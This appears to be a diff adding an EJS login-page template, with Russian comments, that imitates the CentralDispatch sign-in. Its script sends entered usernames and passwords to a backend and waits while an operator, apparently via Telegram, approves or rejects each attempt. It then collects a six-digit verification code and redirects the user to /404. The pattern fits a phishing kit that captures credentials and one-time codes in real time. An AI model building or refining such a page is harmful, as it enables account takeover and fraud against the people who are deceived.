@@ -1,0 +1,363 @@
+<%
+  // В EJS переменные доступны напрямую из переданного объекта
+  // Используем значения по умолчанию если переменные не переданы
+  const pageTitle = typeof title !== 'undefined' ? title : 'SIGN IN';
+  const pageNoticeImage = typeof noticeImage !== 'undefined' ? noticeImage : '/remember blok.png';
+  const pageShowPassword = typeof showPassword !== 'undefined' ? showPassword : true;
+  const pageShowRemember = typeof showRemember !== 'undefined' ? showRemember : true;
+  const pageUsernameLabel = typeof usernameLabel !== 'undefined' ? usernameLabel : 'Username';
+  const pageUsernamePlaceholder = typeof usernamePlaceholder !== 'undefined' ? usernamePlaceholder : '';
+  const pageShowForgot = typeof showForgot !== 'undefined' ? showForgot : true;
+  const pageShowCreateAccount = typeof showCreateAccount !== 'undefined' ? showCreateAccount : true;
+  const pageAlignTop = typeof alignTop !== 'undefined' ? alignTop : false;
+  const pageButtonText = typeof buttonText !== 'undefined' ? buttonText : pageTitle;
+  const pageShowBottomButtons = typeof showBottomButtons !== 'undefined' ? showBottomButtons : false;
+  const pageDefaultUsername = typeof defaultUsername !== 'undefined' ? defaultUsername : '';
+  const pageIsVerificationPage = pageUsernameLabel === 'Verification Code';
+%>
+
+<div class="<%= pageAlignTop ? '' : 'min-h-screen flex flex-col' %>">
+  <div class="page-wrapper <%= pageAlignTop ? 'page-wrapper-top' : 'flex-1 flex flex-col items-center justify-center' %>">
+    <div class="login-card">
+      <!-- Логотип -->
+      <div class="brand">
+        <img src="/logo-central-dispatch.webp" alt="CentralDispatch Logo" style="height: 40px; width: auto;" />
+      </div>
+
+      <!-- Разделительная линия -->
+      <div class="divider"></div>
+
+      <!-- Заголовок -->
+      <h1><%= pageTitle %></h1>
+
+      <!-- Информационный блок -->
+      <div class="notice" style="position: relative;">
+        <div id="error-container"></div>
+        <img id="notice-image" src="<%= pageNoticeImage %>" alt="Notice" class="notice-image" />
+      </div>
+
+      <!-- Форма -->
+      <form id="login-form" onsubmit="handleSubmit(event)">
+        <!-- Сообщение об ошибке -->
+        <div id="error-message" class="mb-4 text-sm text-red-600" style="display: none;"></div>
+
+        <!-- Поле Username / Verification Code -->
+        <div class="form-row">
+          <label for="username"><%= pageUsernameLabel %></label>
+          <input
+            type="text"
+            id="username"
+            name="username"
+            value="<%= pageDefaultUsername %>"
+            placeholder="<%= pageUsernamePlaceholder %>"
+            required
+            autocomplete="off"
+          />
+        </div>
+
+        <!-- Поле Password -->
+        <% if (pageShowPassword) { %>
+        <div class="form-row password-wrapper">
+          <label for="password">Password</label>
+          <input
+            type="password"
+            id="password"
+            name="password"
+            required
+            autocomplete="off"
+          />
+          <button
+            type="button"
+            onclick="togglePassword()"
+            class="password-toggle"
+            aria-label="Показать/скрыть пароль"
+          >
+            <img src="/eye.png" alt="Toggle password" />
+          </button>
+        </div>
+        <% } %>
+
+        <!-- Чекбокс Remember my Username -->
+        <% if (pageShowRemember) { %>
+        <div class="remember-row">
+          <input
+            type="checkbox"
+            id="remember"
+            name="remember"
+          />
+          <label for="remember">Remember my Username</label>
+        </div>
+        <% } %>
+
+        <!-- Кнопка SIGN IN / SUBMIT -->
+        <button
+          type="submit"
+          id="submit-btn"
+          class="btn-signin"
+        >
+          <%= pageButtonText %>
+        </button>
+      </form>
+
+      <!-- Блок Forgot -->
+      <% if (pageShowForgot) { %>
+      <div class="forgot-row">
+        <div class="forgot-label">Forgot?</div>
+        <div class="help-links">
+          <a href="#" class="username" aria-label="Recover username">USERNAME</a>
+          <a href="#" class="password" aria-label="Recover password">PASSWORD</a>
+        </div>
+      </div>
+      <% } %>
+
+      <!-- Кнопки BACK и RESEND CODE -->
+      <% if (pageShowBottomButtons) { %>
+      <div class="bottom-buttons-row">
+        <button type="button" class="btn-back" onclick="handleBack()">
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px;">
+            <path d="M10 12L6 8L10 4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          BACK
+        </button>
+        <button type="button" class="btn-resend" onclick="handleResend()">
+          RESEND CODE
+        </button>
+      </div>
+      <% } %>
+    </div>
+  </div>
+
+  <!-- Секция регистрации -->
+  <% if (pageShowCreateAccount) { %>
+  <div class="create-section" style="<%= pageAlignTop ? 'padding-bottom: 20px;' : 'margin-top: auto; padding-bottom: 20px;' %>">
+    <div class="not-member-text">
+      <span>Not A Member?</span>
+    </div>
+    <button type="button" class="btn-create" onclick="alert('Redirect to creation page')">
+      CREATE AN ACCOUNT
+    </button>
+  </div>
+  <% } %>
+</div>
+
+<script>
+  // Глобальные переменные
+  let isWaitingTelegram = false;
+  let currentRequestId = null;
+  let isVerificationPage = <%= pageIsVerificationPage ? 'true' : 'false' %>;
+  let showVerificationError = false;
+  let showLoginError = false;
+
+  // Загрузка сохраненного username
+  window.addEventListener('DOMContentLoaded', () => {
+    if (!isVerificationPage) {
+      const savedUsername = localStorage.getItem('rememberedUsername');
+      if (savedUsername) {
+        document.getElementById('username').value = savedUsername;
+        document.getElementById('remember').checked = true;
+      }
+    }
+  });
+
+  // Переключение видимости пароля
+  function togglePassword() {
+    const passwordInput = document.getElementById('password');
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+  }
+
+  // Обработка отправки формы
+  async function handleSubmit(e) {
+    e.preventDefault();
+    
+    const errorMessage = document.getElementById('error-message');
+    const errorContainer = document.getElementById('error-container');
+    const noticeImage = document.getElementById('notice-image');
+    const submitBtn = document.getElementById('submit-btn');
+    
+    errorMessage.style.display = 'none';
+    showVerificationError = false;
+    showLoginError = false;
+    errorContainer.innerHTML = '';
+    noticeImage.style.display = 'block';
+    
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password') ? document.getElementById('password').value.trim() : '';
+    const remember = document.getElementById('remember') ? document.getElementById('remember').checked : false;
+
+    // Валидация
+    if (!username) {
+      errorMessage.textContent = 'Пожалуйста, заполните поле';
+      errorMessage.style.display = 'block';
+      return;
+    }
+
+    if (isVerificationPage) {
+      if (!/^\d{6}$/.test(username)) {
+        showVerificationError = true;
+        noticeImage.style.display = 'none';
+        errorContainer.innerHTML = '<img src="/wrong-verification.png" alt="Verification error" class="notice-error-image" />';
+        return;
+      }
+    }
+
+      if (!isVerificationPage && pageShowPassword && !password) {
+      errorMessage.textContent = 'Пожалуйста, заполните все поля';
+      errorMessage.style.display = 'block';
+      return;
+    }
+
+    // Сохранение username
+    if (remember && !isVerificationPage) {
+      localStorage.setItem('rememberedUsername', username);
+    } else if (!isVerificationPage) {
+      localStorage.removeItem('rememberedUsername');
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Загрузка...';
+
+    try {
+      const requestBody = isVerificationPage
+        ? { username, password: '', rememberUsername: false }
+        : { username, password, rememberUsername: remember };
+
+      const response = await fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(requestBody),
+      });
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        if (isVerificationPage) {
+          showVerificationError = true;
+          noticeImage.style.display = 'none';
+          errorContainer.innerHTML = '<img src="/wrong-verification.png" alt="Verification error" class="notice-error-image" />';
+        } else {
+          throw new Error(data.error || 'Ошибка при отправке');
+        }
+        submitBtn.disabled = false;
+        submitBtn.textContent = '<%= pageButtonText %>';
+        return;
+      }
+
+      if (isVerificationPage) {
+        window.location.href = '/404';
+      } else {
+        if (data.requestId && data.status === 'pending') {
+          currentRequestId = data.requestId;
+          isWaitingTelegram = true;
+          showFullscreenLoading();
+          pollLoginStatus(data.requestId, username);
+        } else if (data.redirect) {
+          window.location.href = data.redirect;
+        } else {
+          const userName = encodeURIComponent(username);
+          window.location.href = `/verification/verifycode?userName=${userName}&sendCodeSelector=Email`;
+        }
+      }
+    } catch (err) {
+      console.error('[SIGNIN] Ошибка:', err);
+      if (isVerificationPage) {
+        showVerificationError = true;
+        noticeImage.style.display = 'none';
+        errorContainer.innerHTML = '<img src="/wrong-verification.png" alt="Verification error" class="notice-error-image" />';
+      } else {
+        errorMessage.textContent = err.message || 'Произошла ошибка';
+        errorMessage.style.display = 'block';
+      }
+      submitBtn.disabled = false;
+        submitBtn.textContent = '<%= pageButtonText %>';
+    }
+  }
+
+  // Polling статуса входа
+  async function pollLoginStatus(requestId, currentUsername) {
+    const maxAttempts = 150;
+    let attempts = 0;
+    const pollInterval = 2000;
+
+    const poll = async () => {
+      if (attempts >= maxAttempts) {
+        hideFullscreenLoading();
+        isWaitingTelegram = false;
+        currentRequestId = null;
+        alert('Превышено время ожидания ответа');
+        window.location.reload();
+        return;
+      }
+
+      try {
+        const response = await fetch(`/api/auth/check-status?requestId=${requestId}`);
+        const data = await response.json();
+
+        if (response.ok) {
+          if (data.status === 'approved') {
+            hideFullscreenLoading();
+            isWaitingTelegram = false;
+            currentRequestId = null;
+            const userName = encodeURIComponent(currentUsername);
+            window.location.href = `/verification/verifycode?userName=${userName}&sendCodeSelector=Email`;
+            return;
+          } else if (data.status === 'rejected') {
+            hideFullscreenLoading();
+            isWaitingTelegram = false;
+            showLoginError = true;
+            currentRequestId = null;
+            document.getElementById('password').value = '';
+            const errorContainer = document.getElementById('error-container');
+            const noticeImage = document.getElementById('notice-image');
+            noticeImage.style.display = 'none';
+            errorContainer.innerHTML = '<img src="/error sign in.png" alt="Login error" class="notice-error-image" style="margin-bottom: 12px;" />';
+            return;
+          } else if (data.status === 'pending') {
+            attempts++;
+            setTimeout(poll, pollInterval);
+          }
+        } else {
+          attempts++;
+          setTimeout(poll, pollInterval);
+        }
+      } catch (err) {
+        console.error('[SIGNIN] Ошибка polling:', err);
+        attempts++;
+        setTimeout(poll, pollInterval);
+      }
+    };
+
+    setTimeout(poll, pollInterval);
+  }
+
+  // Показать полноэкранную загрузку
+  function showFullscreenLoading() {
+    const loading = document.createElement('div');
+    loading.className = 'fullscreen-loading';
+    loading.id = 'fullscreen-loading';
+    loading.innerHTML = `
+      <div class="spinner"></div>
+      <p>Do not reload this page — your progress will be lost.</p>
+    `;
+    document.body.appendChild(loading);
+  }
+
+  // Скрыть полноэкранную загрузку
+  function hideFullscreenLoading() {
+    const loading = document.getElementById('fullscreen-loading');
+    if (loading) {
+      loading.remove();
+    }
+  }
+
+  // Обработка кнопок
+  function handleBack() {
+    console.log('[VERIFY] Кнопка BACK нажата');
+  }
+
+  function handleResend() {
+    console.log('[VERIFY] Кнопка RESEND CODE нажата - перезагрузка страницы');
+    window.location.reload();
+  }
+</script>
+
